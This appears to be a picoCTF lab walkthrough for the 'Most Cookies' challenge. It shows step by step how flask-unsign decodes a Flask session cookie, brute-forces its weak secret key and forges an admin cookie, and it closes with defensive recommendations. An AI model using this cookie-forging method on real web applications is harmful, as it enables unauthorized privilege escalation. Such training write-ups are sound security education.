# 🍪 PicoCTF Lab Walkthrough – Most Cookies

## 📌 Challenge Info

* **Category**: Web Exploitation
* **Difficulty**: Medium

---

## 📝 Challenge Description

Forge a Flask session cookie to gain admin privileges and retrieve the flag.

---

## 🔍 Initial Recon

* **Files provided**: None
* **Services/Ports**: Web app using Flask session cookies
* **Hints given**: Flask session manipulation and secret key brute-forcing

---

## 🛠️ Tools & Commands Used

| Tool / Command      | Purpose                                              |
| ------------------- | ---------------------------------------------------- |
| `flask-unsign`      | Decode, brute-force, and forge Flask session cookies |
| Browser DevTools    | Modify and replace cookies                           |
| `keys.txt` wordlist | Used for secret key brute-force                      |

---

## 🧠 Step-by-Step Solution

1. **Cookie Extraction**

   * Captured session cookie:

   ```
   eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aIiRgg.9XpQdaf_wapHmc-JaEH_T1tG6Co
   ```

2. **Cookie Decoding**

   * Ran:

   ```bash
   flask-unsign --decode --cookie "<cookie>"
   ```

   * Revealed:

   ```json
   {"very_auth": "blank"}
   ```

3. **Secret Key Brute-Force**

   * Ran:

   ```bash
   flask-unsign --unsign --cookie "<cookie>" --wordlist keys.txt
   ```

   * Found secret key: **`peanut butter`**

4. **Cookie Forging**

   * Forged new cookie with:

   ```bash
   flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret "peanut butter"
   ```

   * Resulting cookie:

   ```
   eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aIiU1w.sBfCkJfBCOImLsUnHsgNQNpayJw
   ```

5. **Flag Retrieval**

   * Replaced session cookie in browser → accessed page as **admin** → flag revealed.

---

## 🧾 Flag

picoCTF{\[flag]\}

---

## 📚 Learning Outcomes

* Flask session cookies can be manipulated if secret keys are weak.
* Brute-forcing the secret key allows privilege escalation.
* Secure session management is critical to prevent cookie forgery.

---

## 🔒 Recommendations

1. **Input Validation**: Sanitize and validate all user inputs to prevent SQL injection, command injection, and path traversal.
2. **Secure Configuration**: Avoid exposing sensitive files and restrict directory access.
3. **Server-Side Authentication**: Never rely on client-side checks or obfuscation.
4. **Secure Cookie Handling**: Use long, unpredictable secret keys and secure cookie attributes.
5. **Database Security**: Enforce least privilege and strong credentials.

---
